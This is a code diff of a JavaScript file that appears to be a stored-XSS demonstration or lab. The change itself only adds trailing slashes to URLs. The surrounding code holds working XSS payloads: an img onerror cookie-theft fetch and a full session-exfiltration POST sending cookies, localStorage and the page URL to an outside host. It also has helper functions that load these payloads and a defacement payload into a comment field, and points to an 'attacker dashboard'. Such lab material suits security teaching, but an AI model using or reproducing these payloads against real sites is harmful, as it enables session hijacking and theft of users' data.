@@ -182,7 +182,7 @@ console.log('1. Basic XSS: <img src=x onerror=alert(1)>');
 console.log('2. Cookie theft: <img src=x onerror="fetch(\'https://project-1-17.eduhk.hk/exfil?data=\'+document.cookie)">');
 console.log('3. Full exfil: Use debugComments.loadFullExfil()');
 console.log('\n%c⚠️ These attacks persist and affect ALL users!', 'font-weight: bold; color: #dc3545;');
-console.log('%c🎯 View stolen data: https://project-1-17.eduhk.hk', 'font-weight: bold; color: #00ff00;');
+console.log('%c🎯 View stolen data: https://project-1-17.eduhk.hk/', 'font-weight: bold; color: #00ff00;');
 
 // Expose helpful functions
 window.debugComments = {
@@ -194,13 +194,13 @@ window.debugComments = {
   loadCookieTheft: function() {
     document.getElementById('commentText').value = '<img src=x onerror="fetch(\'https://project-1-17.eduhk.hk/exfil?data=\'+document.cookie)">';
     console.log('✅ Cookie theft payload loaded (sends to attacker server)');
-    console.log('🎯 View stolen data at: https://project-1-17.eduhk.hk');
+    console.log('🎯 View stolen data at: https://project-1-17.eduhk.hk/');
   },
   
   loadFullExfil: function() {
     document.getElementById('commentText').value = '<img src=x onerror="fetch(\'https://project-1-17.eduhk.hk/exfil\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})">';
     console.log('✅ Full session exfiltration payload loaded');
-    console.log('🎯 View stolen data at: https://project-1-17.eduhk.hk');
+    console.log('🎯 View stolen data at: https://project-1-17.eduhk.hk/');
   },
   
   loadDefacement: function() {
@@ -214,7 +214,7 @@ window.debugComments = {
     console.log('debugComments.loadCookieTheft() - Load cookie theft (sends to attacker)');
     console.log('debugComments.loadFullExfil() - Load full session exfiltration');
     console.log('debugComments.loadDefacement() - Load defacement XSS');
-    console.log('\n🎯 Attacker dashboard: https://project-1-17.eduhk.hk');
+    console.log('\n🎯 Attacker dashboard: https://project-1-17.eduhk.hk/');
   }
 };
 
